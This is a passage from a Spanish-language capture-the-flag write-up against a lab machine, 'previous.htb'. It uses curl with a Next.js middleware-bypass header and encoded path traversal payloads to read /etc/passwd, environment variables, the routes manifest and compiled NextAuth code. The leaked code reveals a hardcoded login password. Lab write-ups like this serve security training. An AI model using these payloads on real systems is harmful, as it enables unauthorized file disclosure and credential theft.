000000298:   200        19 L     19 W       787 Ch      <span class="s2">"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"</span>                                                          
000000282:   200        19 L     19 W       787 Ch      <span class="s2">"..%2f..%2f..%2f..%2f/etc/passwd"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>si copiamos este <code class="language-plaintext highlighter-rouge">%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd</code> o cualquiera de esos payloads.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"</span> <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span>
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
<span class="nb">sync</span>:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
</pre></td></tr></tbody></table></code></div></div>

<p>Logramos ver el <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>

<p>Cuando logramos conseguir incluir archivos del servidor, es importante seguir una metodologia a la hora de buscar archivos. Como por ejemplo el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, <code class="language-plaintext highlighter-rouge">/proc/self/environ</code>, <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/proc/self/environ"</span> <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span> <span class="nt">--output</span> -<span class="p">;</span> <span class="nb">echo
</span><span class="nv">NODE_VERSION</span><span class="o">=</span>18.20.8HOSTNAME<span class="o">=</span>0.0.0.0YARN_VERSION<span class="o">=</span>1.22.22SHLVL<span class="o">=</span><span class="nv">1PORT</span><span class="o">=</span><span class="nv">3000HOME</span><span class="o">=</span>/home/nextjsPATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNEXT_TELEMETRY_DISABLED<span class="o">=</span><span class="nv">1PWD</span><span class="o">=</span>/appNODE_ENV<span class="o">=</span>production
</pre></td></tr></tbody></table></code></div></div>

<p>Observamos en las variables de entorno que es un proyecto de nextjs que se encuentra en <code class="language-plaintext highlighter-rouge">/app</code>. Quiero saber cuales son las rutas que construye <code class="language-plaintext highlighter-rouge">NextJS</code></p>

<p>Para ahorrar el tiempo de busqueda me tome el trabajo de buscar el archivo que define las rutas de un proyecto en <code class="language-plaintext highlighter-rouge">Nextjs</code></p>

<p>El archivo <code class="language-plaintext highlighter-rouge">.next/routes-manifest.json</code> sirve para que Next.js almacene y comunique información sobre las rutas de su aplicación web de manera optimizada. Este archivo en formato JSON proporciona metadatos que ayudan al framework a entender la estructura de enrutamiento de la aplicación, lo cual es crucial para las funciones de pre-renderizado y optimización del rendimiento.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/app/.next/routes-manifest.json"</span> <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span> | jq
<span class="o">{</span>
  <span class="s2">"version"</span>: 3,
  <span class="s2">"pages404"</span>: <span class="nb">true</span>,
  <span class="s2">"caseSensitive"</span>: <span class="nb">false</span>,
  <span class="s2">"basePath"</span>: <span class="s2">""</span>,
  <span class="s2">"redirects"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"source"</span>: <span class="s2">"/:path+/"</span>,
      <span class="s2">"destination"</span>: <span class="s2">"/:path+"</span>,
      <span class="s2">"internal"</span>: <span class="nb">true</span>,
      <span class="s2">"statusCode"</span>: 308,
      <span class="s2">"regex"</span>: <span class="s2">"^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"</span>
    <span class="o">}</span>
  <span class="o">]</span>,
  <span class="s2">"headers"</span>: <span class="o">[]</span>,
  <span class="s2">"dynamicRoutes"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/api/auth/[...nextauth]"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/api/auth/(.+?)(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{</span>
        <span class="s2">"nxtPnextauth"</span>: <span class="s2">"nxtPnextauth"</span>
      <span class="o">}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/api/auth/(?&lt;nxtPnextauth&gt;.+?)(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/docs/[section]"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/docs/([^/]+?)(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{</span>
        <span class="s2">"nxtPsection"</span>: <span class="s2">"nxtPsection"</span>
      <span class="o">}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/docs/(?&lt;nxtPsection&gt;[^/]+?)(?:/)?$"</span>
    <span class="o">}</span>
  <span class="o">]</span>,
  <span class="s2">"staticRoutes"</span>: <span class="o">[</span>
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/docs"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/docs(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/docs(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/docs/components/layout"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/docs/components/layout(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/docs/components/layout(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/docs/components/sidebar"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/docs/components/sidebar(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/docs/components/sidebar(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/docs/content/examples"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/docs/content/examples(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/docs/content/examples(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/docs/content/getting-started"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/docs/content/getting</span><span class="se">\\</span><span class="s2">-started(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/docs/content/getting</span><span class="se">\\</span><span class="s2">-started(?:/)?$"</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"page"</span>: <span class="s2">"/signin"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/signin(?:/)?$"</span>,
      <span class="s2">"routeKeys"</span>: <span class="o">{}</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/signin(?:/)?$"</span>
    <span class="o">}</span>
  <span class="o">]</span>,
  <span class="s2">"dataRoutes"</span>: <span class="o">[]</span>,
  <span class="s2">"rsc"</span>: <span class="o">{</span>
    <span class="s2">"header"</span>: <span class="s2">"RSC"</span>,
    <span class="s2">"varyHeader"</span>: <span class="s2">"RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch"</span>,
    <span class="s2">"prefetchHeader"</span>: <span class="s2">"Next-Router-Prefetch"</span>,
    <span class="s2">"didPostponeHeader"</span>: <span class="s2">"x-nextjs-postponed"</span>,
    <span class="s2">"contentTypeHeader"</span>: <span class="s2">"text/x-component"</span>,
    <span class="s2">"suffix"</span>: <span class="s2">".rsc"</span>,
    <span class="s2">"prefetchSuffix"</span>: <span class="s2">".prefetch.rsc"</span>,
    <span class="s2">"prefetchSegmentHeader"</span>: <span class="s2">"Next-Router-Segment-Prefetch"</span>,
    <span class="s2">"prefetchSegmentSuffix"</span>: <span class="s2">".segment.rsc"</span>,
    <span class="s2">"prefetchSegmentDirSuffix"</span>: <span class="s2">".segments"</span>
  <span class="o">}</span>,
  <span class="s2">"rewriteHeaders"</span>: <span class="o">{</span>
    <span class="s2">"pathHeader"</span>: <span class="s2">"x-nextjs-rewritten-path"</span>,
    <span class="s2">"queryHeader"</span>: <span class="s2">"x-nextjs-rewritten-query"</span>
  <span class="o">}</span>,
  <span class="s2">"rewrites"</span>: <span class="o">[]</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Si grepeamos por <code class="language-plaintext highlighter-rouge">api</code> para agilizar esto</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/app/.next/routes-manifest.json"</span> <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span> | jq | <span class="nb">grep</span> <span class="s2">"/api"</span>
      <span class="s2">"page"</span>: <span class="s2">"/api/auth/[...nextauth]"</span>,
      <span class="s2">"regex"</span>: <span class="s2">"^/api/auth/(.+?)(?:/)?$"</span>,
      <span class="s2">"namedRegex"</span>: <span class="s2">"^/api/auth/(?&lt;nxtPnextauth&gt;.+?)(?:/)?$"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Tambien encontramos mas informacion sobre un directorio <code class="language-plaintext highlighter-rouge">.next/server</code></p>

<p><code class="language-plaintext highlighter-rouge">.next/server</code> contiene archivos de servidor generados por Next.js, como el código para el renderizado del lado del servidor y las API routes, que son esenciales para ejecutar tu aplicación web en el servidor y mejorar el rendimiento y el SEO. Estos archivos no son para uso directo por parte del desarrollador, sino que son gestionados automáticamente por el framework.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>/app/.next
├── build-manifest.json
├── prerender-manifest.json
├── server/
│   ├── pages/
│   │   └── api/
│   └── app/
├── static/
    └── chunks/
├── cache/
└── routes-manifest.json
</pre></td></tr></tbody></table></code></div></div>

<p>Despleagamos un proyecto basico para saber cuales son las rutas.</p>

<p>Luego de saber las rutas nos acoplamos a seguir tratando de sacar el codigo fuente.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/app/.next/server/pages/api/auth/%5B...nextauth%5D.js"</span> <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span>
<span class="s2">"use strict"</span><span class="p">;</span><span class="o">(()=&gt;{</span>var <span class="nv">e</span><span class="o">={}</span><span class="p">;</span>e.id<span class="o">=</span>651,e.ids<span class="o">=[</span>651],e.modules<span class="o">={</span>3480:<span class="o">(</span>e,n,r<span class="o">)=&gt;{</span>e.exports<span class="o">=</span>r<span class="o">(</span>5600<span class="o">)}</span>,5600:e<span class="o">=&gt;{</span>e.exports<span class="o">=</span>require<span class="o">(</span><span class="s2">"next/dist/compiled/next-server/pages-api.runtime.prod.js"</span><span class="o">)}</span>,6435:<span class="o">(</span>e,n<span class="o">)=&gt;{</span>Object.defineProperty<span class="o">(</span>n,<span class="s2">"M"</span>,<span class="o">{</span>enumerable:!0,get:function<span class="o">(){</span><span class="k">return function </span>e<span class="o">(</span>n,r<span class="o">){</span><span class="k">return </span>r <span class="k">in </span>n?n[r]:<span class="s2">"then"</span><span class="k">in </span>n&amp;&amp;<span class="s2">"function"</span><span class="o">==</span>typeof n.then?n.then<span class="o">(</span><span class="nv">n</span><span class="o">=&gt;</span>e<span class="o">(</span>n,r<span class="o">))</span>:<span class="s2">"function"</span><span class="o">==</span>typeof n&amp;&amp;<span class="s2">"default"</span><span class="o">===</span>r?n:void 0<span class="o">}}})}</span>,8667:<span class="o">(</span>e,n<span class="o">)=&gt;{</span>Object.defineProperty<span class="o">(</span>n,<span class="s2">"A"</span>,<span class="o">{</span>enumerable:!0,get:function<span class="o">(){</span><span class="k">return </span>r<span class="o">}})</span><span class="p">;</span>var <span class="nv">r</span><span class="o">=</span><span class="k">function</span><span class="o">(</span>e<span class="o">){</span><span class="k">return </span>e.PAGES<span class="o">=</span><span class="s2">"PAGES"</span>,e.PAGES_API<span class="o">=</span><span class="s2">"PAGES_API"</span>,e.APP_PAGE<span class="o">=</span><span class="s2">"APP_PAGE"</span>,e.APP_ROUTE<span class="o">=</span><span class="s2">"APP_ROUTE"</span>,e.IMAGE<span class="o">=</span><span class="s2">"IMAGE"</span>,e<span class="o">}({})}</span>,9832:<span class="o">(</span>e,n,r<span class="o">)=&gt;{</span>r.r<span class="o">(</span>n<span class="o">)</span>,r.d<span class="o">(</span>n,<span class="o">{</span>config:<span class="o">()=&gt;</span>l,default:<span class="o">()=&gt;</span>P,routeModule:<span class="o">()=&gt;</span>A<span class="o">})</span><span class="p">;</span>var <span class="nv">t</span><span class="o">={}</span><span class="p">;</span>r.r<span class="o">(</span>t<span class="o">)</span>,r.d<span class="o">(</span>t,<span class="o">{</span>default:<span class="o">()=&gt;</span>p<span class="o">})</span><span class="p">;</span>var <span class="nv">a</span><span class="o">=</span>r<span class="o">(</span>3480<span class="o">)</span>,s<span class="o">=</span>r<span class="o">(</span>8667<span class="o">)</span>,i<span class="o">=</span>r<span class="o">(</span>6435<span class="o">)</span><span class="p">;</span><span class="nb">let </span><span class="nv">u</span><span class="o">=</span>require<span class="o">(</span><span class="s2">"next-auth/providers/credentials"</span><span class="o">)</span>,o<span class="o">={</span>session:<span class="o">{</span>strategy:<span class="s2">"jwt"</span><span class="o">}</span>,providers:[r.n<span class="o">(</span>u<span class="o">)()({</span>name:<span class="s2">"Credentials"</span>,credentials:<span class="o">{</span>username:<span class="o">{</span>label:<span class="s2">"User"</span>,type:<span class="s2">"username"</span><span class="o">}</span>,password:<span class="o">{</span>label:<span class="s2">"Password"</span>,type:<span class="s2">"password"</span><span class="o">}}</span>,authorize:async <span class="nv">e</span><span class="o">=&gt;</span>e?.username<span class="o">===</span><span class="s2">"jeremy"</span><span class="o">&amp;&amp;</span>e.password<span class="o">===(</span>process.env.ADMIN_SECRET??<span class="s2">"MyNameIsJeremyAndILovePancakes"</span><span class="o">)</span>?<span class="o">{</span><span class="nb">id</span>:<span class="s2">"1"</span>,name:<span class="s2">"Jeremy"</span><span class="o">}</span>:null<span class="o">})]</span>,pages:<span class="o">{</span>signIn:<span class="s2">"/signin"</span><span class="o">}</span>,secret:process.env.NEXTAUTH_SECRET<span class="o">}</span>,d<span class="o">=</span>require<span class="o">(</span><span class="s2">"next-auth"</span><span class="o">)</span>,p<span class="o">=</span>r.n<span class="o">(</span>d<span class="o">)()(</span>o<span class="o">)</span>,P<span class="o">=(</span>0,i.M<span class="o">)(</span>t,<span class="s2">"default"</span><span class="o">)</span>,l<span class="o">=(</span>0,i.M<span class="o">)(</span>t,<span class="s2">"config"</span><span class="o">)</span>,A<span class="o">=</span>new a.PagesAPIRouteModule<span class="o">({</span>definition:<span class="o">{</span>kind:s.A.PAGES_API,page:<span class="s2">"/api/auth/[...nextauth]"</span>,pathname:<span class="s2">"/api/auth/[...nextauth]"</span>,bundlePath:<span class="s2">""</span>,filename:<span class="s2">""</span><span class="o">}</span>,userland:t<span class="o">})}}</span><span class="p">;</span>var <span class="nv">n</span><span class="o">=</span>require<span class="o">(</span><span class="s2">"../../../webpack-api-runtime.js"</span><span class="o">)</span><span class="p">;</span>n.C<span class="o">(</span>e<span class="o">)</span><span class="p">;</span>var <span class="nv">r</span><span class="o">=</span>n<span class="o">(</span>n.s<span class="o">=</span>9832<span class="o">)</span><span class="p">;</span>module.exports<span class="o">=</span>r<span class="o">})()</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Este codigo podemos embellecerlo con esto <a href="https://beautifier.io/">Embellecedor</a></p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre></td><td class="rouge-code"><pre><span class="dl">"</span><span class="s2">use strict</span><span class="dl">"</span><span class="p">;</span>
<span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="nx">e</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="mi">651</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ids</span> <span class="o">=</span> <span class="p">[</span><span class="mi">651</span><span class="p">],</span> <span class="nx">e</span><span class="p">.</span><span class="nx">modules</span> <span class="o">=</span> <span class="p">{</span>
        <span class="mi">3480</span><span class="p">:</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5600</span><span class="p">)</span>
        <span class="p">},</span>
        <span class="mi">5600</span><span class="p">:</span> <span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">next/dist/compiled/next-server/pages-api.runtime.prod.js</span><span class="dl">"</span><span class="p">)</span>
        <span class="p">},</span>
        <span class="mi">6435</span><span class="p">:</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nb">Object</span><span class="p">.</span><span class="nf">defineProperty</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="dl">"</span><span class="s2">M</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">enumerable</span><span class="p">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                <span class="na">get</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kd">function</span> <span class="nf">e</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="nx">r</span> <span class="k">in</span> <span class="nx">n</span> <span class="p">?</span> <span class="nx">n</span><span class="p">[</span><span class="nx">r</span><span class="p">]</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">then</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">n</span><span class="p">.</span><span class="nx">then</span> <span class="p">?</span> <span class="nx">n</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">n</span> <span class="o">=&gt;</span> <span class="nf">e</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">))</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">default</span><span class="dl">"</span> <span class="o">===</span> <span class="nx">r</span> <span class="p">?</span> <span class="nx">n</span> <span class="p">:</span> <span class="k">void</span> <span class="mi">0</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">})</span>
        <span class="p">},</span>
        <span class="mi">8667</span><span class="p">:</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nb">Object</span><span class="p">.</span><span class="nf">defineProperty</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">enumerable</span><span class="p">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                <span class="na">get</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nx">r</span>
                <span class="p">}</span>
            <span class="p">});</span>
            <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">PAGES</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">PAGES</span><span class="dl">"</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">PAGES_API</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">PAGES_API</span><span class="dl">"</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">APP_PAGE</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">APP_PAGE</span><span class="dl">"</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">APP_ROUTE</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">APP_ROUTE</span><span class="dl">"</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">IMAGE</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">IMAGE</span><span class="dl">"</span><span class="p">,</span> <span class="nx">e</span>
            <span class="p">}({})</span>
        <span class="p">},</span>
        <span class="mi">9832</span><span class="p">:</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">r</span><span class="p">.</span><span class="nf">r</span><span class="p">(</span><span class="nx">n</span><span class="p">),</span> <span class="nx">r</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">config</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">l</span><span class="p">,</span>
                <span class="na">default</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">P</span><span class="p">,</span>
                <span class="na">routeModule</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">A</span>
            <span class="p">});</span>
            <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">{};</span>
            <span class="nx">r</span><span class="p">.</span><span class="nf">r</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span> <span class="nx">r</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">default</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">p</span>
            <span class="p">});</span>
            <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nf">r</span><span class="p">(</span><span class="mi">3480</span><span class="p">),</span>
                <span class="nx">s</span> <span class="o">=</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8667</span><span class="p">),</span>
                <span class="nx">i</span> <span class="o">=</span> <span class="nf">r</span><span class="p">(</span><span class="mi">6435</span><span class="p">);</span>
            <span class="kd">let</span> <span class="nx">u</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">next-auth/providers/credentials</span><span class="dl">"</span><span class="p">),</span>
                <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span>
                    <span class="na">session</span><span class="p">:</span> <span class="p">{</span>
                        <span class="na">strategy</span><span class="p">:</span> <span class="dl">"</span><span class="s2">jwt</span><span class="dl">"</span>
                    <span class="p">},</span>
                    <span class="na">providers</span><span class="p">:</span> <span class="p">[</span><span class="nx">r</span><span class="p">.</span><span class="nf">n</span><span class="p">(</span><span class="nx">u</span><span class="p">)()({</span>
                        <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Credentials</span><span class="dl">"</span><span class="p">,</span>
                        <span class="na">credentials</span><span class="p">:</span> <span class="p">{</span>
                            <span class="na">username</span><span class="p">:</span> <span class="p">{</span>
                                <span class="na">label</span><span class="p">:</span> <span class="dl">"</span><span class="s2">User</span><span class="dl">"</span><span class="p">,</span>
                                <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span>
                            <span class="p">},</span>
                            <span class="na">password</span><span class="p">:</span> <span class="p">{</span>
                                <span class="na">label</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Password</span><span class="dl">"</span><span class="p">,</span>
                                <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span>
                            <span class="p">}</span>
                        <span class="p">},</span>
